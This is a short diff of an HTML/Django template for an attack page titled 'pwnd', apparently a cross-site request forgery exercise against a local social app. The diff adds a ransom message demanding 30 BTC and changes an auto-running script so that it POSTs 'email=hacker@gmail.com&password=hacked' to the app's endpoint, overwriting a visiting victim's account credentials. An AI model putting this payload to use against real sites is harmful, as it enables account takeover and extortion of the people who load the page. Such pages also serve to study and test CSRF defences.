@@ -1,7 +1,10 @@
 <!doctype html>
+{% load static %}
 <html lang="en">
 <title>pwnd</title>
-You have been pwned
+You have been pwned. Send 30 btc to this wallet to regain access -
+<br>
+<img src ="{% static "download.png" %}" >
 <body >
   <script>
 
@@ -9,7 +12,7 @@ You have been pwned
       var post_url = "http://127.0.0.1:8000/social/home/" ;
       xhr.open("POST",post_url,true);
       xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
-      var data = "&name=hacked"
+      var data = "email=hacker@gmail.com&password=hacked"
       xhr.send(data)
 
   </script>
